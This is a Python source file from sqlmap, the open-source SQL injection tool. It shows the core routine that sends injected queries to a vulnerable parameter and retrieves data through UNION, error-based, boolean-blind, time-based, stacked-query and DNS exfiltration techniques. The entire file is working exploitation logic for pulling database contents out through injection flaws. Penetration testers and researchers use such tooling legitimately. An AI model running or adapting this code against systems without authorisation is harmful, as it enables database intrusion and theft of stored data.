#!/usr/bin/env python

"""
Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from __future__ import print_function

import re
import time

from lib.core.agent import agent
from lib.core.bigarray import BigArray
from lib.core.common import applyFunctionRecursively
from lib.core.common import Backend
from lib.core.common import calculateDeltaSeconds
from lib.core.common import cleanQuery
from lib.core.common import expandAsteriskForColumns
from lib.core.common import extractExpectedValue
from lib.core.common import filterNone
from lib.core.common import getPublicTypeMembers
from lib.core.common import getTechnique
from lib.core.common import getTechniqueData
from lib.core.common import hashDBRetrieve
from lib.core.common import hashDBWrite
from lib.core.common import initTechnique
from lib.core.common import isDigit
from lib.core.common import isNoneValue
from lib.core.common import isNumPosStrValue
from lib.core.common import isTechniqueAvailable
from lib.core.common import parseUnionPage
from lib.core.common import popValue
from lib.core.common import pushValue
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.common import setTechnique
from lib.core.common import singleTimeWarnMessage
from lib.core.compat import xrange
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.decorators import lockedmethod
from lib.core.decorators import stackedmethod
from lib.core.dicts import FROM_DUMMY_TABLE
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import DBMS
from lib.core.enums import EXPECTED
from lib.core.enums import PAYLOAD
from lib.core.exception import SqlmapConnectionException
from lib.core.exception import SqlmapDataException
from lib.core.exception import SqlmapNotVulnerableException
from lib.core.exception import SqlmapUserQuitException
from lib.core.settings import GET_VALUE_UPPERCASE_KEYWORDS
from lib.core.settings import INFERENCE_MARKER
from lib.core.settings import MAX_TECHNIQUES_PER_VALUE
from lib.core.settings import SQL_SCALAR_REGEX
from lib.core.settings import UNICODE_ENCODING
from lib.core.threads import getCurrentThreadData
from lib.request.connect import Connect as Request
from lib.request.direct import direct
from lib.techniques.blind.inference import bisection
from lib.techniques.blind.inference import queryOutputLength
from lib.techniques.dns.test import dnsTest
from lib.techniques.dns.use import dnsUse
from lib.techniques.error.use import errorUse
from lib.techniques.union.use import unionUse
from thirdparty import six

def _goDns(payload, expression):
    value = None

    if conf.dnsDomain and kb.dnsTest is not False and not kb.testMode and Backend.getDbms() is not None:
        if kb.dnsTest is None:
            dnsTest(payload)

        if kb.dnsTest:
            value = dnsUse(payload, expression)

    return value

def _goInference(payload, expression, charsetType=None, firstChar=None, lastChar=None, dump=False, field=None):
    start = time.time()
    value = None
    count = 0

    value = _goDns(payload, expression)

    if payload is None:
        return None

    if value is not None:
        return value

    timeBasedCompare = (getTechnique() in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED))

    if timeBasedCompare and conf.threads > 1 and kb.forceThreads is None:
        msg = "multi-threading is considered unsafe in "
        msg += "time-based data retrieval. Are you sure "
        msg += "of your choice (breaking warranty) [y/N] "

        kb.forceThreads = readInput(msg, default='N', boolean=True)

    if not (timeBasedCompare and kb.dnsTest):
        if (conf.eta or conf.threads > 1) and Backend.getIdentifiedDbms() and not re.search(r"(COUNT|LTRIM)\(", expression, re.I) and not (timeBasedCompare and not kb.forceThreads):

            if field and re.search(r"\ASELECT\s+DISTINCT\((.+?)\)\s+FROM", expression, re.I):
                if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL, DBMS.MONETDB, DBMS.VERTICA, DBMS.CRATEDB, DBMS.CUBRID):
                    alias = randomStr(lowercase=True, seed=hash(expression))
                    expression = "SELECT %s FROM (%s)" % (field if '.' not in field else re.sub(r".+\.", "%s." % alias, field), expression)  # Note: MonetDB as a prime example
                    expression += " AS %s" % alias
                else:
                    expression = "SELECT %s FROM (%s)" % (field, expression)

            if field and conf.hexConvert or conf.binaryFields and field in conf.binaryFields or Backend.getIdentifiedDbms() in (DBMS.RAIMA,):
                nulledCastedField = agent.nullAndCastField(field)
                injExpression = expression.replace(field, nulledCastedField, 1)
            else:
                injExpression = expression
            length = queryOutputLength(injExpression, payload)
        else:
            length = None

        kb.inferenceMode = True
        count, value = bisection(payload, expression, length, charsetType, firstChar, lastChar, dump)
        kb.inferenceMode = False

        if not kb.bruteMode:
            debugMsg = "performed %d quer%s in %.2f seconds" % (count, 'y' if count == 1 else "ies", calculateDeltaSeconds(start))
            logger.debug(debugMsg)

    return value

def _goInferenceFields(expression, expressionFields, expressionFieldsList, payload, num=None, charsetType=None, firstChar=None, lastChar=None, dump=False):
    outputs = []
    origExpr = None

    for field in expressionFieldsList:
        output = None

        if field.startswith("ROWNUM "):
            continue

        if isinstance(num, int):
            origExpr = expression
            expression = agent.limitQuery(num, expression, field, expressionFieldsList[0])

        if "ROWNUM" in expressionFieldsList:
            expressionReplaced = expression
        else:
            expressionReplaced = expression.replace(expressionFields, field, 1)

        output = _goInference(payload, expressionReplaced, charsetType, firstChar, lastChar, dump, field)

        if isinstance(num, int):
            expression = origExpr

        outputs.append(output)

    return outputs

def _goInferenceProxy(expression, fromUser=False, batch=False, unpack=True, charsetType=None, firstChar=None, lastChar=None, dump=False):
    """
    Retrieve the output of a SQL query characted by character taking
    advantage of an blind SQL injection vulnerability on the affected
    parameter through a bisection algorithm.
    """

    initTechnique(getTechnique())

    query = agent.prefixQuery(getTechniqueData().vector)
    query = agent.suffixQuery(query)
    payload = agent.payload(newValue=query)
    count = None
    startLimit = 0
    stopLimit = None
    outputs = BigArray()

    if not unpack:
        return _goInference(payload, expression, charsetType, firstChar, lastChar, dump)

    _, _, _, _, _, expressionFieldsList, expressionFields, _ = agent.getFields(expression)

    rdbRegExp = re.search(r"RDB\$GET_CONTEXT\([^)]+\)", expression, re.I)
    if rdbRegExp and Backend.isDbms(DBMS.FIREBIRD):
        expressionFieldsList = [expressionFields]

    if len(expressionFieldsList) > 1:
        infoMsg = "the SQL query provided has more than one field. "
        infoMsg += "sqlmap will now unpack it into distinct queries "
        infoMsg += "to be able to retrieve the output even if we "
        infoMsg += "are going blind"
        logger.info(infoMsg)

    # If we have been here from SQL query/shell we have to check if
    # the SQL query might return multiple entries and in such case
    # forge the SQL limiting the query output one entry at a time
    # NOTE: we assume that only queries that get data from a table
    # can return multiple entries
    if fromUser and " FROM " in expression.upper() and ((Backend.getIdentifiedDbms() not in FROM_DUMMY_TABLE) or (Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and not expression.upper().endswith(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]))) and not re.search(SQL_SCALAR_REGEX, expression, re.I) and hasattr(queries[Backend.getIdentifiedDbms()].limitregexp, "query"):
        expression, limitCond, topLimit, startLimit, stopLimit = agent.limitCondition(expression)

        if limitCond:
            test = True

            if stopLimit is None or stopLimit <= 1:
                if Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and expression.upper().endswith(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]):
                    test = False

            if test:
                # Count the number of SQL query entries output
                countFirstField = queries[Backend.getIdentifiedDbms()].count.query % expressionFieldsList[0]
                countedExpression = expression.replace(expressionFields, countFirstField, 1)

                if " ORDER BY " in countedExpression.upper():
                    _ = countedExpression.upper().rindex(" ORDER BY ")
                    countedExpression = countedExpression[:_]

                if not stopLimit:
                    count = _goInference(payload, countedExpression, charsetType=CHARSET_TYPE.DIGITS, firstChar=firstChar, lastChar=lastChar)

                    if isNumPosStrValue(count):
                        count = int(count)

                        if batch or count == 1:
                            stopLimit = count
                        else:
                            message = "the SQL query provided can return "
                            message += "%d entries. How many " % count
                            message += "entries do you want to retrieve?\n"
                            message += "[a] All (default)\n[#] Specific number\n"
                            message += "[q] Quit"
                            choice = readInput(message, default='A').upper()

                            if choice == 'A':
                                stopLimit = count

                            elif choice == 'Q':
                                raise SqlmapUserQuitException

                            elif isDigit(choice) and int(choice) > 0 and int(choice) <= count:
                                stopLimit = int(choice)

                                infoMsg = "sqlmap is now going to retrieve the "
                                infoMsg += "first %d query output entries" % stopLimit
                                logger.info(infoMsg)

                            elif choice in ('#', 'S'):
                                message = "how many? "
                                stopLimit = readInput(message, default="10")

                                if not isDigit(stopLimit):
                                    errMsg = "invalid choice"
                                    logger.error(errMsg)

                                    return None

                                else:
                                    stopLimit = int(stopLimit)

                            else:
                                errMsg = "invalid choice"
                                logger.error(errMsg)

                                return None

                    elif count and not isDigit(count):
                        warnMsg = "it was not possible to count the number "
                        warnMsg += "of entries for the SQL query provided. "
                        warnMsg += "sqlmap will assume that it returns only "
                        warnMsg += "one entry"
                        logger.warning(warnMsg)

                        stopLimit = 1

                    elif not isNumPosStrValue(count):
                        if not count:
                            warnMsg = "the SQL query provided does not "
                            warnMsg += "return any output"
                            logger.warning(warnMsg)

                        return None

                elif (not stopLimit or stopLimit == 0):
                    return None

                try:
                    try:
                        for num in xrange(startLimit or 0, stopLimit or 0):
                            output = _goInferenceFields(expression, expressionFields, expressionFieldsList, payload, num=num, charsetType=charsetType, firstChar=firstChar, lastChar=lastChar, dump=dump)
                            outputs.append(output)
                    except OverflowError:
                        errMsg = "boundary limits (%d,%d) are too large. Please rerun " % (startLimit, stopLimit)
                        errMsg += "with switch '--fresh-queries'"
                        raise SqlmapDataException(errMsg)

                except KeyboardInterrupt:
                    print()
                    warnMsg = "user aborted during dumping phase"
                    logger.warning(warnMsg)

                return outputs

    elif Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and expression.upper().startswith("SELECT ") and " FROM " not in expression.upper():
        expression += FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]

    outputs = _goInferenceFields(expression, expressionFields, expressionFieldsList, payload, charsetType=charsetType, firstChar=firstChar, lastChar=lastChar, dump=dump)

    return ", ".join(output or "" for output in outputs) if not isNoneValue(outputs) else None

def _goBooleanProxy(expression):
    """
    Retrieve the output of a boolean based SQL query
    """

    initTechnique(getTechnique())

    if conf.dnsDomain:
        query = agent.prefixQuery(getTechniqueData().vector)
        query = agent.suffixQuery(query)
        payload = agent.payload(newValue=query)
        output = _goDns(payload, expression)

        if output is not None:
            return output

    vector = getTechniqueData().vector
    vector = vector.replace(INFERENCE_MARKER, expression)
    query = agent.prefixQuery(vector)
    query = agent.suffixQuery(query)
    payload = agent.payload(newValue=query)

    timeBasedCompare = getTechnique() in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED)

    output = hashDBRetrieve(expression, checkConf=True)

    if output is None:
        output = Request.queryPage(payload, timeBasedCompare=timeBasedCompare, raise404=False)

        if output is not None:
            hashDBWrite(expression, output)

    return output

def _goUnion(expression, unpack=True, dump=False):
    """
    Retrieve the output of a SQL query taking advantage of an union SQL
    injection vulnerability on the affected parameter.
    """

    output = unionUse(expression, unpack=unpack, dump=dump)

    if isinstance(output, six.string_types):
        output = parseUnionPage(output)

    return output

@lockedmethod
@stackedmethod
def getValue(expression, blind=True, union=True, error=True, time=True, fromUser=False, expected=None, batch=False, unpack=True, resumeValue=True, charsetType=None, firstChar=None, lastChar=None, dump=False, suppressOutput=None, expectingNone=False, safeCharEncode=True):
    """
    Called each time sqlmap inject a SQL query on the SQL injection
    affected parameter.
    """

    if conf.hexConvert and expected != EXPECTED.BOOL and Backend.getIdentifiedDbms():
        if not hasattr(queries[Backend.getIdentifiedDbms()], "hex"):
            warnMsg = "switch '--hex' is currently not supported on DBMS %s" % Backend.getIdentifiedDbms()
            singleTimeWarnMessage(warnMsg)
            conf.hexConvert = False
        else:
            charsetType = CHARSET_TYPE.HEXADECIMAL

    kb.safeCharEncode = safeCharEncode
    kb.resumeValues = resumeValue

    for keyword in GET_VALUE_UPPERCASE_KEYWORDS:
        expression = re.sub(r"(?i)(\A|\(|\)|\s)%s(\Z|\(|\)|\s)" % keyword, r"\g<1>%s\g<2>" % keyword, expression)

    if suppressOutput is not None:
        pushValue(getCurrentThreadData().disableStdOut)
        getCurrentThreadData().disableStdOut = suppressOutput

    try:
        pushValue(conf.db)
        pushValue(conf.tbl)

        if expected == EXPECTED.BOOL:
            forgeCaseExpression = booleanExpression = expression

            if expression.startswith("SELECT "):
                booleanExpression = "(%s)=%s" % (booleanExpression, "'1'" if "'1'" in booleanExpression else "1")
            else:
                forgeCaseExpression = agent.forgeCaseStatement(expression)

        if conf.direct:
            value = direct(forgeCaseExpression if expected == EXPECTED.BOOL else expression)

        elif any(isTechniqueAvailable(_) for _ in getPublicTypeMembers(PAYLOAD.TECHNIQUE, onlyValues=True)):
            query = cleanQuery(expression)
            query = expandAsteriskForColumns(query)
            value = None
            found = False
            count = 0

            if query and not re.search(r"COUNT.*FROM.*\(.*DISTINCT", query, re.I):
                query = query.replace("DISTINCT ", "")

            if not conf.forceDns:
                if union and isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
                    setTechnique(PAYLOAD.TECHNIQUE.UNION)
                    kb.forcePartialUnion = kb.injection.data[PAYLOAD.TECHNIQUE.UNION].vector[8]
                    fallback = not expected and kb.injection.data[PAYLOAD.TECHNIQUE.UNION].where == PAYLOAD.WHERE.ORIGINAL and not kb.forcePartialUnion

                    if expected == EXPECTED.BOOL:
                        # Note: some DBMSes (e.g. Altibase) don't support implicit conversion of boolean check result during concatenation with prefix and suffix (e.g. 'qjjvq'||(1=1)||'qbbbq')

                        if not any(_ in forgeCaseExpression for _ in ("SELECT", "CASE")):
                            forgeCaseExpression = "(CASE WHEN (%s) THEN '1' ELSE '0' END)" % forgeCaseExpression

                    try:
                        value = _goUnion(forgeCaseExpression if expected == EXPECTED.BOOL else query, unpack, dump)
                    except SqlmapConnectionException:
                        if not fallback:
                            raise

                    count += 1
                    found = (value is not None) or (value is None and expectingNone) or count >= MAX_TECHNIQUES_PER_VALUE

                    if not found and fallback:
                        warnMsg = "something went wrong with full UNION "
                        warnMsg += "technique (could be because of "
                        warnMsg += "limitation on retrieved number of entries)"
                        if " FROM " in query.upper():
                            warnMsg += ". Falling back to partial UNION technique"
                            singleTimeWarnMessage(warnMsg)

                            try:
                                pushValue(kb.forcePartialUnion)
                                kb.forcePartialUnion = True
                                value = _goUnion(query, unpack, dump)
                                found = (value is not None) or (value is None and expectingNone)
                            finally:
                                kb.forcePartialUnion = popValue()
                        else:
                            singleTimeWarnMessage(warnMsg)

                if error and any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) and not found:
                    setTechnique(PAYLOAD.TECHNIQUE.ERROR if isTechniqueAvailable(PAYLOAD.TECHNIQUE.ERROR) else PAYLOAD.TECHNIQUE.QUERY)
                    value = errorUse(forgeCaseExpression if expected == EXPECTED.BOOL else query, dump)
                    count += 1
                    found = (value is not None) or (value is None and expectingNone) or count >= MAX_TECHNIQUES_PER_VALUE

                if found and conf.dnsDomain:
                    _ = "".join(filterNone(key if isTechniqueAvailable(value) else None for key, value in {'E': PAYLOAD.TECHNIQUE.ERROR, 'Q': PAYLOAD.TECHNIQUE.QUERY, 'U': PAYLOAD.TECHNIQUE.UNION}.items()))
                    warnMsg = "option '--dns-domain' will be ignored "
                    warnMsg += "as faster techniques are usable "
                    warnMsg += "(%s) " % _
                    singleTimeWarnMessage(warnMsg)

            if blind and isTechniqueAvailable(PAYLOAD.TECHNIQUE.BOOLEAN) and not found:
                setTechnique(PAYLOAD.TECHNIQUE.BOOLEAN)

                if expected == EXPECTED.BOOL:
                    value = _goBooleanProxy(booleanExpression)
                else:
                    value = _goInferenceProxy(query, fromUser, batch, unpack, charsetType, firstChar, lastChar, dump)

                count += 1
                found = (value is not None) or (value is None and expectingNone) or count >= MAX_TECHNIQUES_PER_VALUE

            if time and (isTechniqueAvailable(PAYLOAD.TECHNIQUE.TIME) or isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED)) and not found:
                match = re.search(r"\bFROM\b ([^ ]+).+ORDER BY ([^ ]+)", expression)
                kb.responseTimeMode = "%s|%s" % (match.group(1), match.group(2)) if match else None

                if isTechniqueAvailable(PAYLOAD.TECHNIQUE.TIME):
                    setTechnique(PAYLOAD.TECHNIQUE.TIME)
                else:
                    setTechnique(PAYLOAD.TECHNIQUE.STACKED)

                if expected == EXPECTED.BOOL:
                    value = _goBooleanProxy(booleanExpression)
                else:
                    value = _goInferenceProxy(query, fromUser, batch, unpack, charsetType, firstChar, lastChar, dump)
        else:
            errMsg = "none of the injection types identified can be "
            errMsg += "leveraged to retrieve queries output"
            raise SqlmapNotVulnerableException(errMsg)

    finally:
        kb.resumeValues = True
        kb.responseTimeMode = None

        conf.tbl = popValue()
        conf.db = popValue()

        if suppressOutput is not None:
            getCurrentThreadData().disableStdOut = popValue()

    kb.safeCharEncode = False

    if not any((kb.testMode, conf.dummy, conf.offline, conf.noCast, conf.hexConvert)) and value is None and Backend.getDbms() and conf.dbmsHandler and kb.fingerprinted:
        if conf.abortOnEmpty:
            errMsg = "aborting due to empty data retrieval"
            logger.critical(errMsg)
            raise SystemExit
        else:
            warnMsg = "in case of continuous data retrieval problems you are advised to try "
            warnMsg += "a switch '--no-cast' "
            warnMsg += "or switch '--hex'" if hasattr(queries[Backend.getIdentifiedDbms()], "hex") else ""
            singleTimeWarnMessage(warnMsg)

    # Dirty patch (MSSQL --binary-fields with 0x31003200...)
    if Backend.isDbms(DBMS.MSSQL) and conf.binaryFields:
        def _(value):
            if isinstance(value, six.text_type):
                if value.startswith(u"0x"):
                    value = value[2:]
                    if value and len(value) % 4 == 0:
                        candidate = ""
                        for i in xrange(len(value)):
                            if i % 4 < 2:
                                candidate += value[i]
                            elif value[i] != '0':
                                candidate = None
                                break
                        if candidate:
                            value = candidate
            return value

        value = applyFunctionRecursively(value, _)

    # Dirty patch (safe-encoded unicode characters)
    if isinstance(value, six.text_type) and "\\x" in value:
        try:
            candidate = eval(repr(value).replace("\\\\x", "\\x").replace("u'", "'", 1)).decode(conf.encoding or UNICODE_ENCODING)
            if "\\x" not in candidate:
                value = candidate
        except:
            pass

    return extractExpectedValue(value, expected)

def goStacked(expression, silent=False):
    if PAYLOAD.TECHNIQUE.STACKED in kb.injection.data:
        setTechnique(PAYLOAD.TECHNIQUE.STACKED)
    else:
        for technique in getPublicTypeMembers(PAYLOAD.TECHNIQUE, True):
            _ = getTechniqueData(technique)
            if _ and "stacked" in _["title"].lower():
                setTechnique(technique)
                break

    expression = cleanQuery(expression)

    if conf.direct:
        return direct(expression)

    query = agent.prefixQuery(";%s" % expression)
    query = agent.suffixQuery(query)
    payload = agent.payload(newValue=query)
    Request.queryPage(payload, content=False, silent=silent, noteResponseTime=False, timeBasedCompare="SELECT" in (payload or "").upper())

def checkBooleanExpression(expression, expectingNone=True):
    return getValue(expression, expected=EXPECTED.BOOL, charsetType=CHARSET_TYPE.BINARY, suppressOutput=True, expectingNone=expectingNone)
